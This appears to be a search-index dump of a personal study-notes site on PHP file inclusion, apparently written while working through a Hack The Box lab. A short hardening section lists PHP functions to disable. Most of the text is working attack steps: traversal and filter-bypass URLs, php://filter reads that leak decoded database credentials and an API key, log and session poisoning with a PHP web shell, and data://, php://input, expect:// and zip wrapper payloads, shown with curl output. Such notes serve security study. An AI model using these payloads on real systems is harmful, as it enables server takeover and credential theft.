intezer","title":"Useful"},{"location":"file_inclusion/hardening_tips/","text":"The purpose of hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend. According to the FireEye M-Trends Report of 2020 , the average time it took a company to detect hackers was 30 days. With proper hardening, attackers will leave many more signs, and the organization will hopefully detect these events even quicker. It is important to understand the goal of hardening is not to make your system unhackable, meaning you cannot neglect watching logs over a hardened system because it is \"secure\". Hardened systems should be continually tested, especially after a zero-day is released for a related application to your system (ex: Apache Struts, RAILS, Django, etc.). Preventing Directory Traversal \u00b6 If attackers can control the directory, they can escape the web application and attack something they are more familiar with or use a universal attack chain. For example, they could: Read /etc/passwd and potentially find SSH Keys or know valid user names for a password spray attack Find other services on the box such as Tomcat and read the tomcat-users.xml file Discover valid PHP Session Cookies and perform session hijacking Read current web application configuration and gain access to the secret used to protect cookies. In some frameworks, this cookie gets unserialized in an unsafe manner, and just reading the configuration can lead to remote code execution The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has basename() which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final / as the filename. The downside to this method is that if the application needs to enter any directories, it will not be able to do it. Doing the Correct Checks \u00b6 A common attack vector of LFI's happens when applications incorrectly check for malicious things. The most common being using deny lists instead of allow lists . A great example of this is upload forms where the PHP extension gets blocked from being uploaded, not realizing several other extensions exist that have the same functionality (php1, php2, php3, etc.). If an allow list was utilized only to allow jpeg, gif, and png to be accessed, the attack might have been avoided altogether. When validating extensions, be sure the application utilizes the programming languages built-in tools to extract the extension before comparing. If the built-in tools won't suffice for some reason, then utilize Regular Expressions and be sure to place the end of line terminator ($) at the end of user input. If neither of these is done, the application will likely check for an approved extension in the filename, which may not really be the extension (ex: file.php.jpg ). Application Hardening \u00b6 It is often possible to configure the webserver environment to prevent malicious code from running in the first place. There are often ways around application hardening as it prevents behaviors the attackers can avoid. However, attackers will generate error messages trying to get around the application hardening, which grants defenders time to react to a vulnerability. For example, if the system() function is blocked, a log will be created about the blocked functionality being used when an attacker uses it. Hopefully, this is a rare event, and if emails get sent out, the defender may be able to react before the attacker figures out why the event was blocked. This is why web applications should never display error messages to the website ; if the attacker can see why their attack failed, it will be trivial to bypass. To disable this in PHP, edit the php.ini file and verify: display_errors = Off is set. To block system() in PHP, append the functions you want to block to the \"disabled_functions\" lines of PHP. A list of functions recommended blocking is: system, passthru, shell_exec, popen, proc_open, curl_exec, curl_multi_exec, parse_ini_file, show_source It is pretty rare for web applications to load files from remote locations, so it is advised this functionality also be disabled. In PHP this can be done by setting allow_url_fopen and allow_url_include to Off. It's also often possible to jail web applications, preventing them from accessing non-web related files. The most common way to do this in today's age is running the application within Docker . However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding open_basedir = /var/www in the php.ini file Web Application Firewall \u00b6 The universal way to harden applications is to utilize a WAF (Web Application Firewall). When dealing with WAF's, the most important thing to avoid is false positives and blocking non-malicious requests.","title":"Hardening Tips"},{"location":"file_inclusion/hardening_tips/#preventing-directory-traversal","text":"If attackers can control the directory, they can escape the web application and attack something they are more familiar with or use a universal attack chain. For example, they could: Read /etc/passwd and potentially find SSH Keys or know valid user names for a password spray attack Find other services on the box such as Tomcat and read the tomcat-users.xml file Discover valid PHP Session Cookies and perform session hijacking Read current web application configuration and gain access to the secret used to protect cookies. In some frameworks, this cookie gets unserialized in an unsafe manner, and just reading the configuration can lead to remote code execution The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has basename() which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final / as the filename. The downside to this method is that if the application needs to enter any directories, it will not be able to do it.","title":"Preventing Directory Traversal"},{"location":"file_inclusion/hardening_tips/#doing-the-correct-checks","text":"A common attack vector of LFI's happens when applications incorrectly check for malicious things. The most common being using deny lists instead of allow lists . A great example of this is upload forms where the PHP extension gets blocked from being uploaded, not realizing several other extensions exist that have the same functionality (php1, php2, php3, etc.). If an allow list was utilized only to allow jpeg, gif, and png to be accessed, the attack might have been avoided altogether. When validating extensions, be sure the application utilizes the programming languages built-in tools to extract the extension before comparing. If the built-in tools won't suffice for some reason, then utilize Regular Expressions and be sure to place the end of line terminator ($) at the end of user input. If neither of these is done, the application will likely check for an approved extension in the filename, which may not really be the extension (ex: file.php.jpg ).","title":"Doing the Correct Checks"},{"location":"file_inclusion/hardening_tips/#application-hardening","text":"It is often possible to configure the webserver environment to prevent malicious code from running in the first place. There are often ways around application hardening as it prevents behaviors the attackers can avoid. However, attackers will generate error messages trying to get around the application hardening, which grants defenders time to react to a vulnerability. For example, if the system() function is blocked, a log will be created about the blocked functionality being used when an attacker uses it. Hopefully, this is a rare event, and if emails get sent out, the defender may be able to react before the attacker figures out why the event was blocked. This is why web applications should never display error messages to the website ; if the attacker can see why their attack failed, it will be trivial to bypass. To disable this in PHP, edit the php.ini file and verify: display_errors = Off is set. To block system() in PHP, append the functions you want to block to the \"disabled_functions\" lines of PHP. A list of functions recommended blocking is: system, passthru, shell_exec, popen, proc_open, curl_exec, curl_multi_exec, parse_ini_file, show_source It is pretty rare for web applications to load files from remote locations, so it is advised this functionality also be disabled. In PHP this can be done by setting allow_url_fopen and allow_url_include to Off. It's also often possible to jail web applications, preventing them from accessing non-web related files. The most common way to do this in today's age is running the application within Docker . However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding open_basedir = /var/www in the php.ini file","title":"Application Hardening"},{"location":"file_inclusion/hardening_tips/#web-application-firewall","text":"The universal way to harden applications is to utilize a WAF (Web Application Firewall). When dealing with WAF's, the most important thing to avoid is false positives and blocking non-malicious requests.","title":"Web Application Firewall"},{"location":"file_inclusion/intro/","text":"File Inclusion is a common web application vulnerability, which can be easily overlooked as part of the application functionality. LFI vs. RFI \u00b6 Almost any Remote File Inclusion (RFI) can also be a Local File Inclusion (LFI); however, any LFI may not be an RFI. This is primarily because of two reasons: You may only control a portion of the filename and not the entire protocol wrapper (ex: http:// , ftp:// , https:// ) The configuration may prevent RFI all together. For example, in PHP, by setting allow_url_include to 0 , it will not be possible to use remote sources within the include() statement Where it's Common \u00b6 The most common place you will find LFI Vulnerabilities is within templating engines. This is because websites want to keep a large majority of the website the same when navigating between pages, such as the header, navigation bar, and footer. Without dynamic page generation, every page on the server would need to be modified when changes are made to any of those sections. This is why you will often see a parameter like /index.php?page=about . Under the hood, index.php will probably pull header.php , about.php , and footer.php . Since you control the about portion of the request, it may be possible to have the webserver grab other files! Another common place is within languages. If you see ?lang=en ; then the website will grab files from the /en/ directory. Other Places \u00b6 It can be found anytime the server allows a user to download a file. For example, imagine if the server-side code to retrieve your avatar downloaded from /profile/$username/avatar.png . If you managed to craft a malicious username, it might be possible to change that file request to /profile/../../../../etc/passwd avatar.png and grab /etc/passwd instead of your avatar. Poisoning the database entry and having a separate function utilize that poisoned entry is called \"Second Order\". Developers often overlook these vulnerabilities because they are in the mindset of \"Never Trust User Input\". In this example, the retrieve avatar function is grabbing data from the database, and the developer may not realize it is actually user input.","title":"Introduction"},{"location":"file_inclusion/intro/#lfi-vs-rfi","text":"Almost any Remote File Inclusion (RFI) can also be a Local File Inclusion (LFI); however, any LFI may not be an RFI. This is primarily because of two reasons: You may only control a portion of the filename and not the entire protocol wrapper (ex: http:// , ftp:// , https:// ) The configuration may prevent RFI all together. For example, in PHP, by setting allow_url_include to 0 , it will not be possible to use remote sources within the include() statement","title":"LFI vs. RFI"},{"location":"file_inclusion/intro/#where-its-common","text":"The most common place you will find LFI Vulnerabilities is within templating engines. This is because websites want to keep a large majority of the website the same when navigating between pages, such as the header, navigation bar, and footer. Without dynamic page generation, every page on the server would need to be modified when changes are made to any of those sections. This is why you will often see a parameter like /index.php?page=about . Under the hood, index.php will probably pull header.php , about.php , and footer.php . Since you control the about portion of the request, it may be possible to have the webserver grab other files! Another common place is within languages. If you see ?lang=en ; then the website will grab files from the /en/ directory.","title":"Where it's Common"},{"location":"file_inclusion/intro/#other-places","text":"It can be found anytime the server allows a user to download a file. For example, imagine if the server-side code to retrieve your avatar downloaded from /profile/$username/avatar.png . If you managed to craft a malicious username, it might be possible to change that file request to /profile/../../../../etc/passwd avatar.png and grab /etc/passwd instead of your avatar. Poisoning the database entry and having a separate function utilize that poisoned entry is called \"Second Order\". Developers often overlook these vulnerabilities because they are in the mindset of \"Never Trust User Input\". In this example, the retrieve avatar function is grabbing data from the database, and the developer may not realize it is actually user input.","title":"Other Places"},{"location":"file_inclusion/lfi/","text":"Basic LFI \u00b6 http://134.209.184.216:32391/basic/index.php?language=es.php Let's try changing the filename to a world-readable file, such as /etc/passwd on Linux or C:\\Windows\\boot.ini on Windows. http://134.209.184.216:32391/basic/index.php?language=/etc/passwd LFI with Path Traversal \u00b6 Sometimes, developers specify absolute paths when including files. For example: include(\"./languages/\" . $_GET['language']); http://134.209.184.216:32391/traversal/index.php?language=../../../../../../../../../etc/passwd Input from parameters can even be used as part of filenames: include(\"lang_\" . $_GET['language']); In this scenario, input such as ../../../../../etc/passwd will result in the final string to be lang_../../../../../etc/passwd , which is invalid. Instead, prefixing a / before the payload will bypass the filename and traverse directories instead. http://134.209.184.216:32569/traversal/index_2.php?language=/../../../../../etc/passwd LFI with Blacklisting \u00b6 Scripts can employ search and replace techniques to avoid path traversals: $language = str_replace('../', '', $_GET['language']); http://134.209.184.216:32391/blacklist/index.php?language=....//....//....//....//....//....//....//....//etc/passwd If the defender wanted to prevent this, an example of doing this recursively would be: $lfi = \"....././/..../..//filename\"; while( substr_count($lfi, '../', 0)) { $lfi = str_replace('../', '', $lfi); }; Bypass with URL Encoding \u00b6 On PHP versions 5.3.4 and earlier, string-based detection could be bypassed by URL encoding the payload. The characters ../ can be URL encoded into %2e%2e%2f , which will bypass the filter. 134.209.184.216:32391/blacklist/index.php?language=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc% 2fpasswd LFI with Appended Extension \u00b6 Scripts can manually append a . php or any other required extension before including the file, which serves as mitigation against the inclusion of arbitrary files. include($_GET['language'] . \".php\"); The following filters will convert the contents of /etc/passwd to base64 and ROT13, respectively. php://filter/read=convert.base64-encode/resource=/etc/passwd php://filter/read=string.rot13/resource=/etc/passwd Let's try base64 encoding and including the file config.php using the filter. http://134.209.184.216:32391/extension/index.php?language=php://filter/read=convert.base64-encode/resource=config The .php extension is added automatically by the server. The original contents can be obtained by base64 decoding the output. The entire base64 encoded contents can be obtained by either sending the request in web proxy, such as Burp Suite , or using cURL . hrmns@htb[/htb]$ curl http://134.209.184.216:32391/extension/index.php?language = php://filter/read = convert.base64-encode/resource = config <!DOCTYPE html> <html lang=\"en\" > <head> <meta charset=\"UTF-8\"> <title>Inlane Freight</title> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <link href=\"https://fonts.googleapis.com/css?family=Poppins:300,400,700\" rel=\"stylesheet\"> <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css'><link rel=\"stylesheet\" href=\"./style.css\"> </head> <body> <div class=\"navbar\"> <a href=\"#home\">Inlane Freight</a> <div class=\"dropdown\"> <button class=\"dropbtn\">Language <i class=\"fa fa-caret-down\"></i> </button> <div class=\"dropdown-content\"> <a href=\"index.php?language=en\">English</a> <a href=\"index.php?language=es\">Spanish</a> </div> </div> </div> <!-- partial:index.partial.html --> <div class=\"blog-card\"> <div class=\"meta\"> <div class=\"photo\" style=\"background-image: url(./image.jpg)\"></div> <ul class=\"details\"> <li class=\"author\"><a href=\"#\">John Doe</a></li> <li class=\"date\">Aug. 24, 2019</li> </ul> </div> <div class=\"description\"> <h1>History</h1> <h2>Containers</h2> PD9waHAKCiRjb25maWc9YXJyYXkoCidEQl9IT1NUJz0+J2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAonREJfVVNFUk5BTUUnPT4ncm9vdCcsCidEQl9QQVNTV09SRCc9PidEQl9BZG1pbl9QQHNzdzByZCEnLAonREJfREFUQUJBU0UnPT4nYmxvZ2RiJwopOwoKJEFQSV9LRVkgPSAiQXdldzI0MkdEc2hyZjQ2KzM1L2siOwoKLyoKJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkY29uZmlnWydEQl9IT1NUJ10sICRjb25maWdbJ0RCX1VTRVJOQU1FJ10sICRjb25maWdbJ0RCX1BBU1NXT1JEJ10sICRjb25maWdbJ0RCX0RBVEFCQVNFJ10pOwoKaWYgKG15c3FsaV9jb25uZWN0X2Vycm5vKCRjb25uKSkKICB7CgogIAllY2hvICJGYWlsZWQgY29ubmVjdGluZy4gIiAuIG15c3FsaV9jb25uZWN0X2Vycm9yKCkgLiAiPGJyLz4iOwoKICB9CiovCgo/Pgo=<br /> <b>Notice</b>: Undefined variable: p2 in <b>/var/www/html/extension/index.php</b> on line <b>48</b><br /> <p class=\"read-more\"> <a href=\"#\">Read More</a> </p> </div> </div> <div class=\"blog-card alt\"> <div class=\"meta\"> <div class=\"photo\" style=\"background-image: url(./image.jpg)\"></div> <ul class=\"details\"> <li class=\"author\"><a href=\"#\">Jane Doe</a></li> <li class=\"date\">July. 15, 2019</li> </ul> </div> <div class=\"description\"> <h1>Container Industry</h1> <h2>Opening a door to the future</h2> <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad eum dolorum architecto obcaecati enim dicta praesentium, quam nobis! Neque ad aliquam facilis numquam. Veritatis, sit.</p> <p class=\"read-more\"> <a href=\"#\">Read More</a> </p> </div> </div> <!-- partial --> </body> </html> hrmns@htb[/htb]$ echo 'PD9waHAKCiRjb25maWc9YXJyYXkoCidEQl9IT1NUJz0+J2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAonREJfVVNFUk5BTUUnPT4ncm9vdCcsCidEQl9QQVNTV09SRCc9PidEQl9BZG1pbl9QQHNzdzByZCEnLAonREJfREFUQUJBU0UnPT4nYmxvZ2RiJwopOwoKJEFQSV9LRVkgPSAiQXdldzI0MkdEc2hyZjQ2KzM1L2siOwoKLyoKJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkY29uZmlnWydEQl9IT1NUJ10sICRjb25maWdbJ0RCX1VTRVJOQU1FJ10sICRjb25maWdbJ0RCX1BBU1NXT1JEJ10sICRjb25maWdbJ0RCX0RBVEFCQVNFJ10pOwoKaWYgKG15c3FsaV9jb25uZWN0X2Vycm5vKCRjb25uKSkKICB7CgogIAllY2hvICJGYWlsZWQgY29ubmVjdGluZy4gIiAuIG15c3FsaV9jb25uZWN0X2Vycm9yKCkgLiAiPGJyLz4iOwoKICB9CiovCgo/Pgo=' | base64 -d <?php $ config = array ( 'DB_HOST'=>'db.inlanefreight.local', 'DB_USERNAME'=>'root', 'DB_PASSWORD'=>'DB_Admin_P@ssw0rd!', 'DB_DATABASE'=>'blogdb' ); $ API_KEY = \"Awew242GDshrf46+35/k\" ; /* $ conn = mysqli_connect ( $config [ 'DB_HOST' ] , $config [ 'DB_USERNAME' ] , $config [ 'DB_PASSWORD' ] , $config [ 'DB_DATABASE' ]) ; if (mysqli_connect_errno($conn)) { echo \"Failed connecting. \" . mysqli_connect_error() . \"<br/>\"; } */ ?> Bypass Using Null Byte \u00b6 PHP versions before 5.5 are vulnerable to null byte injection, meaning that adding a null byte at the end of the filename should bypass the extension check. For example: language=/etc/passwd%00 will result in the statement include(\"/etc/passwd%00.php\") , where the server ignores everything after the null byte. This occurs because C and C++ consider strings to be terminated by null bytes, while PHP doesn't. The URL encoded null byte (%00) at the end of the filename gets .php appended to it but is truncated to /etc/passwd\\x00 by the APIs written in C. This results in the inclusion of /etc/passwd instead of /etc/passwd.php when the include() function is called.","title":"LFI"},{"location":"file_inclusion/lfi/#basic-lfi","text":"http://134.209.184.216:32391/basic/index.php?language=es.php Let's try changing the filename to a world-readable file, such as /etc/passwd on Linux or C:\\Windows\\boot.ini on Windows. http://134.209.184.216:32391/basic/index.php?language=/etc/passwd","title":"Basic LFI"},{"location":"file_inclusion/lfi/#lfi-with-path-traversal","text":"Sometimes, developers specify absolute paths when including files. For example: include(\"./languages/\" . $_GET['language']); http://134.209.184.216:32391/traversal/index.php?language=../../../../../../../../../etc/passwd Input from parameters can even be used as part of filenames: include(\"lang_\" . $_GET['language']); In this scenario, input such as ../../../../../etc/passwd will result in the final string to be lang_../../../../../etc/passwd , which is invalid. Instead, prefixing a / before the payload will bypass the filename and traverse directories instead. http://134.209.184.216:32569/traversal/index_2.php?language=/../../../../../etc/passwd","title":"LFI with Path Traversal"},{"location":"file_inclusion/lfi/#lfi-with-blacklisting","text":"Scripts can employ search and replace techniques to avoid path traversals: $language = str_replace('../', '', $_GET['language']); http://134.209.184.216:32391/blacklist/index.php?language=....//....//....//....//....//....//....//....//etc/passwd If the defender wanted to prevent this, an example of doing this recursively would be: $lfi = \"....././/..../..//filename\"; while( substr_count($lfi, '../', 0)) { $lfi = str_replace('../', '', $lfi); };","title":"LFI with Blacklisting"},{"location":"file_inclusion/lfi/#bypass-with-url-encoding","text":"On PHP versions 5.3.4 and earlier, string-based detection could be bypassed by URL encoding the payload. The characters ../ can be URL encoded into %2e%2e%2f , which will bypass the filter. 134.209.184.216:32391/blacklist/index.php?language=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc% 2fpasswd","title":"Bypass with URL Encoding"},{"location":"file_inclusion/lfi/#lfi-with-appended-extension","text":"Scripts can manually append a . php or any other required extension before including the file, which serves as mitigation against the inclusion of arbitrary files. include($_GET['language'] . \".php\"); The following filters will convert the contents of /etc/passwd to base64 and ROT13, respectively. php://filter/read=convert.base64-encode/resource=/etc/passwd php://filter/read=string.rot13/resource=/etc/passwd Let's try base64 encoding and including the file config.php using the filter. http://134.209.184.216:32391/extension/index.php?language=php://filter/read=convert.base64-encode/resource=config The .php extension is added automatically by the server. The original contents can be obtained by base64 decoding the output. The entire base64 encoded contents can be obtained by either sending the request in web proxy, such as Burp Suite , or using cURL . hrmns@htb[/htb]$ curl http://134.209.184.216:32391/extension/index.php?language = php://filter/read = convert.base64-encode/resource = config <!DOCTYPE html> <html lang=\"en\" > <head> <meta charset=\"UTF-8\"> <title>Inlane Freight</title> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <link href=\"https://fonts.googleapis.com/css?family=Poppins:300,400,700\" rel=\"stylesheet\"> <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css'><link rel=\"stylesheet\" href=\"./style.css\"> </head> <body> <div class=\"navbar\"> <a href=\"#home\">Inlane Freight</a> <div class=\"dropdown\"> <button class=\"dropbtn\">Language <i class=\"fa fa-caret-down\"></i> </button> <div class=\"dropdown-content\"> <a href=\"index.php?language=en\">English</a> <a href=\"index.php?language=es\">Spanish</a> </div> </div> </div> <!-- partial:index.partial.html --> <div class=\"blog-card\"> <div class=\"meta\"> <div class=\"photo\" style=\"background-image: url(./image.jpg)\"></div> <ul class=\"details\"> <li class=\"author\"><a href=\"#\">John Doe</a></li> <li class=\"date\">Aug. 24, 2019</li> </ul> </div> <div class=\"description\"> <h1>History</h1> <h2>Containers</h2> PD9waHAKCiRjb25maWc9YXJyYXkoCidEQl9IT1NUJz0+J2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAonREJfVVNFUk5BTUUnPT4ncm9vdCcsCidEQl9QQVNTV09SRCc9PidEQl9BZG1pbl9QQHNzdzByZCEnLAonREJfREFUQUJBU0UnPT4nYmxvZ2RiJwopOwoKJEFQSV9LRVkgPSAiQXdldzI0MkdEc2hyZjQ2KzM1L2siOwoKLyoKJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkY29uZmlnWydEQl9IT1NUJ10sICRjb25maWdbJ0RCX1VTRVJOQU1FJ10sICRjb25maWdbJ0RCX1BBU1NXT1JEJ10sICRjb25maWdbJ0RCX0RBVEFCQVNFJ10pOwoKaWYgKG15c3FsaV9jb25uZWN0X2Vycm5vKCRjb25uKSkKICB7CgogIAllY2hvICJGYWlsZWQgY29ubmVjdGluZy4gIiAuIG15c3FsaV9jb25uZWN0X2Vycm9yKCkgLiAiPGJyLz4iOwoKICB9CiovCgo/Pgo=<br /> <b>Notice</b>: Undefined variable: p2 in <b>/var/www/html/extension/index.php</b> on line <b>48</b><br /> <p class=\"read-more\"> <a href=\"#\">Read More</a> </p> </div> </div> <div class=\"blog-card alt\"> <div class=\"meta\"> <div class=\"photo\" style=\"background-image: url(./image.jpg)\"></div> <ul class=\"details\"> <li class=\"author\"><a href=\"#\">Jane Doe</a></li> <li class=\"date\">July. 15, 2019</li> </ul> </div> <div class=\"description\"> <h1>Container Industry</h1> <h2>Opening a door to the future</h2> <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad eum dolorum architecto obcaecati enim dicta praesentium, quam nobis! Neque ad aliquam facilis numquam. Veritatis, sit.</p> <p class=\"read-more\"> <a href=\"#\">Read More</a> </p> </div> </div> <!-- partial --> </body> </html> hrmns@htb[/htb]$ echo 'PD9waHAKCiRjb25maWc9YXJyYXkoCidEQl9IT1NUJz0+J2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAonREJfVVNFUk5BTUUnPT4ncm9vdCcsCidEQl9QQVNTV09SRCc9PidEQl9BZG1pbl9QQHNzdzByZCEnLAonREJfREFUQUJBU0UnPT4nYmxvZ2RiJwopOwoKJEFQSV9LRVkgPSAiQXdldzI0MkdEc2hyZjQ2KzM1L2siOwoKLyoKJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkY29uZmlnWydEQl9IT1NUJ10sICRjb25maWdbJ0RCX1VTRVJOQU1FJ10sICRjb25maWdbJ0RCX1BBU1NXT1JEJ10sICRjb25maWdbJ0RCX0RBVEFCQVNFJ10pOwoKaWYgKG15c3FsaV9jb25uZWN0X2Vycm5vKCRjb25uKSkKICB7CgogIAllY2hvICJGYWlsZWQgY29ubmVjdGluZy4gIiAuIG15c3FsaV9jb25uZWN0X2Vycm9yKCkgLiAiPGJyLz4iOwoKICB9CiovCgo/Pgo=' | base64 -d <?php $ config = array ( 'DB_HOST'=>'db.inlanefreight.local', 'DB_USERNAME'=>'root', 'DB_PASSWORD'=>'DB_Admin_P@ssw0rd!', 'DB_DATABASE'=>'blogdb' ); $ API_KEY = \"Awew242GDshrf46+35/k\" ; /* $ conn = mysqli_connect ( $config [ 'DB_HOST' ] , $config [ 'DB_USERNAME' ] , $config [ 'DB_PASSWORD' ] , $config [ 'DB_DATABASE' ]) ; if (mysqli_connect_errno($conn)) { echo \"Failed connecting. \" . mysqli_connect_error() . \"<br/>\"; } */ ?>","title":"LFI with Appended Extension"},{"location":"file_inclusion/lfi/#bypass-using-null-byte","text":"PHP versions before 5.5 are vulnerable to null byte injection, meaning that adding a null byte at the end of the filename should bypass the extension check. For example: language=/etc/passwd%00 will result in the statement include(\"/etc/passwd%00.php\") , where the server ignores everything after the null byte. This occurs because C and C++ consider strings to be terminated by null bytes, while PHP doesn't. The URL encoded null byte (%00) at the end of the filename gets .php appended to it but is truncated to /etc/passwd\\x00 by the APIs written in C. This results in the inclusion of /etc/passwd instead of /etc/passwd.php when the include() function is called.","title":"Bypass Using Null Byte"},{"location":"file_inclusion/lfi_to_rce/","text":"LFI can lead to Remote Code Execution (RCE) under some conditions, resulting in a complete server compromise. One common way is to poison log files, which are modified based on requests to the webserver. Try including the Apache access log at /var/log/apache2/access.log http://134.209.184.216:32415/index.php?language=/var/log/apache2/access.log The log contains the remote IP address, request page, response code, and the user-agent string. The User-Agent depends on the user's browser and can be edited by intercepting the request. Start Burp Suite , intercept a request to the page, and send it to Repeater. Next, change the User-Agent header to something else such as Apache Log Poisoning and click Go . We can take advantage of this by setting our User-Agent to a PHP shell such as <?php system($_GET['cmd']); ?> . This gets logged into the file and gets executed by the server as PHP code on inclusion. We can now execute OS-level commands by adding a parameter to the GET request. Some other files that can be included based on the scenario are /var/log/nginx/access.log , /var/log/sshd.log , /var/log/mail , and /var/log/vsftpd.log . On older servers, the /proc/self/environ file can be included, which can be poisoned through the User-Agent string. RCE through PHP Session Files \u00b6 Similar to server log files, PHP saves user sessions on disk. This path is dictated by the session.save_path configuration variable, which is empty by default. In such cases, the session files are saved to the /var/lib/php/sessions/ folder on Linux and C:\\Windows\\Temp on Windows. The name of the session file can be identified from the PHPSESSID cookie. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3 then it's location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3 . The PHPSESSID cookie is found to be stored by the browser. Include this and view its contents. http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd The session file contains language preference and the selected page . Let's try poisoning the value of page by sending something through the language parameter http://134.209.184.216:32415/index.php?language=session_poisoning This should \"poison\" the session file and add session_poisoning to it. Let's include the session file once again to look at the contents. http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd This time the session file contains session_poisoning instead of es.php , which confirms our ability to poison the session file. Next, let's write a PHP web shell to it using the following URL: http://134.209.184.216:32415/index.php?language=<?php system($_GET['cmd']); ?> We can now include the session file and use the cmd parameter to execute operating system commands. http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten by \" /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd \" during inclusion.","title":"LFI to RCE"},{"location":"file_inclusion/lfi_to_rce/#rce-through-php-session-files","text":"Similar to server log files, PHP saves user sessions on disk. This path is dictated by the session.save_path configuration variable, which is empty by default. In such cases, the session files are saved to the /var/lib/php/sessions/ folder on Linux and C:\\Windows\\Temp on Windows. The name of the session file can be identified from the PHPSESSID cookie. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3 then it's location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3 . The PHPSESSID cookie is found to be stored by the browser. Include this and view its contents. http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd The session file contains language preference and the selected page . Let's try poisoning the value of page by sending something through the language parameter http://134.209.184.216:32415/index.php?language=session_poisoning This should \"poison\" the session file and add session_poisoning to it. Let's include the session file once again to look at the contents. http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd This time the session file contains session_poisoning instead of es.php , which confirms our ability to poison the session file. Next, let's write a PHP web shell to it using the following URL: http://134.209.184.216:32415/index.php?language=<?php system($_GET['cmd']); ?> We can now include the session file and use the cmd parameter to execute operating system commands. http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten by \" /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd \" during inclusion.","title":"RCE through PHP Session Files"},{"location":"file_inclusion/other_php_wrappers/","text":"PHP provides some additional wrappers which can be leveraged to gain command execution. Expect Wrapper \u00b6 The expect wrapper in PHP helps in interaction with process streams. This extension is disabled by default but can prove very useful if enabled. For example, the following URL will return the output of the id command. http://blog.inlanefreight.com/index.php?language=expect://id Data Wrapper \u00b6 The data wrapper can be used to include external data, even PHP code. It's possible to use this only if the allow_url_include setting is enabled in the PHP configuration. This can be found in the file /etc/php/X.Y/apache2/php.ini for Apache and in /etc/php/X.Y/fpm/php.ini for php-fpm used by Nginx, where X.Y is your install PHP version. First, base64 encode a PHP web shell hrmns@htb[/htb]$ echo '<?php system($_GET[' cmd ']); ?>' | base64 PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo= Then include it using the data wrapper http://blog.inlanefreight.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id http://134.209.184.216:30084/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id Input Wrapper \u00b6 The input wrapper can be used to include external input and execute code. It also needs the allow_url_include setting enabled. The following curl command sends a POST request with a system command and then includes it using php://input , which gets executed by the page hrmns@htb[/htb]$ curl -s -X POST --data \"<?php system('id'); ?>\" \"http://134.209.184.216:30084/index.php?language=php://input\" | grep uid uid=33(www-data) gid=33(www-data) groups=33(www-data) Zip Wrapper \u00b6 The zip wrapper can prove useful in combination with file uploads. If the website allows uploading arbitrary files, an attacker can upload a malicious zip file and include PHP code. This wrapper isn't enabled by default and can be installed with the command below: hrmns@htb[/htb]$ apt install phpX.Y-zip hrmns@htb[/htb]$ echo '<?php system($_GET[' cmd ']); ?>' > exec.php hrmns@htb[/htb]$ zip malicious.zip exec.php hrmns@htb[/htb]$ rm exec.php Copy malicious.zip to the webroot to simulate the upload. The files in the zip archive can be referenced using the # symbol, which should be 